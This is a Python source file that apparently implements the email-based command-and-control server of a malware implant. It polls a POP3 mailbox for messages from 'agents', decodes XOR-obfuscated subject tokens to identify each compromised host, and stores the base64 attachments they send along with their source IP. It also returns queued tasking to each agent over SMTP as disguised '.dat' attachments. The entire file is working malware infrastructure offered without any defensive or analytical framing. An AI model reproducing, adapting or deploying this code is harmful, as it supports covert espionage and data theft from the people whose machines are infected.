# coding=utf-8
import time
import poplib
import smtplib
import email
import binascii
import struct
import base64
import XABase64
import socket
import re
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from random import randint
# import settings 
# from settings import P2_Scheme, P3_Scheme, LocalStorage, , \
# POP3_MAIL_IP, SMTP_MAIL_IP, POP3_ADDR, POP3_PASS, SMTP_FROM_ADDR, SMTP_PASS, SMTP_TO_ADDR
import settings
import logging


class MailServer(object):
    def __init__(self, settings=settings, logger=logging):
        self.smtp = None
        self.pop3 = None
        self.agents_list = []

        self.settings = settings
        self.pop3_port = settings.POP3_PORT
        self.smtp_port = settings.SMTP_PORT
        self.log = logger
        # self.log.basicConfig(level=logging.info)
        self.log.basicConfig(level=logging.INFO)
        self.storage = settings.LocalStorage
        self.server_log = settings.ServerLogger
        self.p2s = settings.P2_Scheme
        self.p3s = settings.P3_Scheme
        self.pop3host = settings.POP3_MAIL_IP
        self.smtphost = settings.SMTP_MAIL_IP
        self.pop3addr = settings.POP3_ADDR
        self.smtp_to_addr = settings.SMTP_TO_ADDR
        self.smtp_from_addr = settings.SMTP_FROM_ADDR
        self.pop3_pass = settings.POP3_PASS
        self.smtp_pass = settings.SMTP_PASS
        self.log.basicConfig()

    # def get_content(self, content):
    # try:
    #         return base64.urlsafe_b64decode(content)
    #     except Exception as e:
    #         self.log.error(e)
    #         return

    def get_msg(self, msg):
        try:
            subject = base64.b64decode(msg['Subject'])
            return subject
        except Exception as e:
            self.log.error(e)
            self.log.info(msg.as_string())
            return

    def get_token(self, msg):
        if not msg:
            return
        xor = self.get_msg(msg)
        if not xor:
            return

        try:
            bin_junk = self.p2s.binary_junk_len
            data = XABase64.xor(xor[bin_junk:], xor[:bin_junk])
            subject_token_len = len(self.p2s.subj_token)
            if data[:subject_token_len] == self.p2s.subj_token:
                aid = struct.unpack('<I', data[subject_token_len:])[0]
                return aid
            else:
                return

        except Exception as e:
            self.log.error(e)
            return

    def delete(self, num):
        try:
            self.pop3.dele(num)
            self.pop3.quit()
        except Exception as e:
            self.log.error(e)
            self.pop3.quit()
            return

    def get_ip(self, received):
        pattern_ip = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
        if not isinstance(received, str):
            received = str(received)
        ip = re.findall(pattern_ip, received)
        try:
            return ip[-1]
        except Exception as e:
            self.log.error(e)
            return ''

    def popssl(self):
        try:
            self.pop3 = poplib.POP3_SSL(self.pop3host, self.pop3_port)
            # self.pop3.set_debuglevel(1)

        except Exception as e:
            self.log.error(e)
            time.sleep(20)

    def login(self):
        try:
            self.pop3.user(self.pop3addr)
            self.pop3.pass_(self.pop3_pass)
        except Exception as e:
            self.log.error(e)
            time.sleep(20)


    def stats(self):
        try:
            # email nums
            stat = self.pop3.stat()[0]
        except Exception as e:
            self.log.error(e)
            stat = 0
            return
        time.sleep(1)
        return stat

    def meta_from(self, msg):
        received = msg.get_all('received')

        ip = self.get_ip(received)
        timestamp = self.iso_time()
        meta = self.pack_p3s(ip, timestamp)
        return ip, timestamp, meta

    def msg_from_list(self, item):
        try:
            status, alines, octets = self.pop3.retr(item)
            msg = email.message_from_string('\n'.join(alines))
        except Exception as e:
            self.log.error(e)
            return
        return msg

    def data_from(self, body):
        if len(body):
            try:
                return self.p3s.pack_agent_data(body)
            except Exception as e:
                self.log.error(e)
                return
        return

    def part_msg(self, part):
        try:
            cont = part.get_content_type()
            if "application/octet-stream" in cont:
                body = part.get_payload().replace('\r', '').replace(' ', '').replace('\n', '')
                base64_size = part.values()[-1].split(";\n")[-1]
                base64_size = base64_size[len('size=')+1:]
                body = body[:int(base64_size)]
                body = base64.b64decode(body)
                return self.data_from(body)
            return
        except Exception as e:
            self.log.error(e)
            return

    def pack_p3s(self, *args):
        if not len(args):
            self.log.error("NO META TO P3S PACK!")
            return
        try:
            data = self.p3s.separator.join([i for i in args])
        except Exception as e:
            self.log.error(e)
            return

        try:
            pack = self.p3s.pack_data(data)
        except Exception as e:
            self.log.error(e)
            return
        return pack

    def recv_mail(self):
        self.popssl()
        self.login()
        stats = self.stats()
        if not stats:
            self.log.info("NO MESSAGES FROM AGENT (POP3)")
            return
        self.log.info("%i MESSAGES FROM AGENT (POP3)" % stats)
        mess_list = self.pop3.list()
        mess_list = mess_list[1]
        for item in mess_list:
            if ' ' in item:
                num = item.split(' ')[0]
            else:
                print "NEW LOGIC POP3:"
                print "ITEM VIEW:", item
                num = 1
            msg = self.msg_from_list(num)
            if not msg:
                continue
            ip, timestamp, meta = self.meta_from(msg)
            agent_id = self.get_token(msg)
            if not agent_id:
                self.delete(num)
                continue

            for part in msg.walk():
                data = self.part_msg(part)
                if data:
                    data = self.p3s.separator.join([meta, data])
                    self.storage.save_data_from_agent(agent_id, data)
                    info = self.pack_p3s("GET", timestamp, ip)
                    self.storage.save_status_info_for_agent(agent_id, info)
                    break
            self.delete(num)

    def smtp_list(self):
        self.agents_list = self.storage.get_agents_list()
        if not len(self.agents_list):
            self.log.info("NO ACTIVE AGENT FOR SMTP")
            return
        for agent_id in self.agents_list:
            self.send_mail_for(agent_id)
            
    def send_mail_for(self, agent_id):
        mark, res_body = self.storage.get_data_for_agent(agent_id)
        if not res_body:
            self.log.info("NO AGENT DATA FOR SMTP")
            return
        try:
            self.smtp = smtplib.SMTP(self.smtphost, self.smtp_port)
        except Exception as e:
            self.log.error("Cant connect to %s" % self.smtphost)
            self.log.error(e)
            time.sleep(20)
            return

        try:

            self.smtp.ehlo()
            self.smtp.starttls()
            self.smtp.login(self.smtp_from_addr, self.smtp_pass)
        except Exception as e:
            print('Incorrect login or password! (%s)' % self.smtp_to_addr)
            self.smtp.quit()
            self.log.error(e)
            return

        self.storage.data_for_agent_accepted(agent_id, mark)
        self.subject(res_body, agent_id)

    def iso_time(self):
        return datetime.utcnow().isoformat()


    def subject(self, body, agent_id):
        print(type(agent_id))
        body = base64.b64encode(body)
        subject = self.p2s.pack_agent_data(str(agent_id))
        msg = MIMEMultipart('alternative')
        msg['Date'] = self.iso_time()
        msg['Subject'] = subject
        msg['From'] = self.smtp_from_addr
        msg['To'] = self.smtp_to_addr
        _attach = MIMEBase('application', 'octet-stream')
        _attach.set_payload(body)
        filename = 'detaluri_%s.dat size=%s  ' % (time.strftime("%d%m%Y%H%M"), str(len(body)))
        _attach.add_header('Content-Disposition', 'attachment', filename=filename)
        _text = MIMEText('gamarjoba')
        msg.attach(_text)
        msg.attach(_attach)
        # print self.log.info("MESSAGE RESULT AS STRING:")
        # print msg.as_string()

        try:
            senders = self.smtp.sendmail(self.smtp_from_addr, [self.smtp_to_addr], msg.as_string())
        except Exception as e:

            self.log.error(e)

        for addr, (code, resp) in senders.items():
            self.log.info("Message for %s send with (error code: %i, error message: %s)" % (addr, code, resp))
        (code, resp) = self.smtp.quit()

        self.log.info("SMTP: Quit with (error code: %i, error message: %s)" % (code, resp))
        time.sleep(0.1)


if __name__ == '__main__':
    mail = MailServer(settings=settings, logger=logging)
    while 1:
        mail.recv_mail()
        mail.smtp_list()
